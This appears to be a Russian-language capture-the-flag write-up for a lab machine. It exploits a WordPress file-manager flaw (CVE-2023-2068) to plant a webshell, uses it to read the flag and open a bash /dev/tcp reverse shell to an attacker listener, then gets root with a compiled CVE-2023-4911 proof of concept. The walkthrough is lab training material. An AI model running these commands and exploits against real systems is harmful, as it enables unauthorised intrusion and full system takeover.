@@ -1,0 +1,42 @@
+[web-1-1] Remote code execution (RCE) on library.edu.stf
+добавляем в /etc/hosts
+в коде странице находим библиотеку wordpress http://library.edu.stf/library -> поиск CVE-2023-2068  https://www.exploit-db.com/exploits/51505
+я поменял exploit немного потому что не смог цепануть fmakey ссылка https://github.com/explorerfeatures1/ctf/blob/main/CVE-2023-2068.py
+
+python3 CVE-2023-2068.py ip_адрес_web "whoami" 
+
+[*] Trying original exploit method...
+[*] Original method response: 200
+[*] Response preview: {"added":[{"isowner":false,"ts":1768904325,"mime":"text\/x-php","read":1,"write":1,"size":"29","hash":"l1_ZXhwbG9pdC5waHA","name":"exploit.php","phash":"l1_Lw","url":"http:\/\/library.edu.stf\/exploit
+[+] Webshell uploaded at: http://library.edu.stf/explorer.php
+[+] Command output: **9e45c528-0df6-41f5-9416-7d068c3afb0e**
+
+вебшел загружен через параметр cmd проверяем RCE
+curl "http://library.edu.stf/explorer.php?cmd=ls+-la"
+флаг можно прочитать curl "http://library.edu.stf/explorer.php?cmd=/home/rceflag"
+У меня были проблемы с получением reverse shell, обфусцировал, кодировал менял нагрузку, в итоге проблема была что врублен firewall на kali )
+sudo ufw disable 
+
+поднимаем listener 
+rlwap nc -lvnp 4444
+
+триггерим
+curl "http://library.edu.stf/explorer.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.10/4444+0>%261'"
+стабилизируем шел через  python3 -c "import pty; pty.spawn('/bin/bash')"
+
+Повышение привилегий походил по системе, запустил linpeas в /tmp, но особо ничего (кроме PwnKit конечно)))
+в хинтах написали проверить библиотеки 
+www-data@library:/tmp$ ldd --version                                                                                                                                     
+ldd (Ubuntu GLIBC 2.36-0ubuntu4) 2.36    
+ищем CVE  (https://github.com/NishanthAnand21/CVE-2023-4911-PoC?ysclid=mknqjaf5uz256966871)
+скачиваем на машину через git clone  https://github.com/NishanthAnand21/CVE-2023-4911-PoC.git
+
+
+компилируем (gcc предустановлен)
+````
+www-data@library:/tmp/CVE-2023-4911-PoC$ gcc exploit.c -o explorerfeatures1
+еще питон 
+$ python3 genlib.py появляется директория '"'
+запускаем
+./explorerfeatures1 
+ждем минут 5 ->  мы root
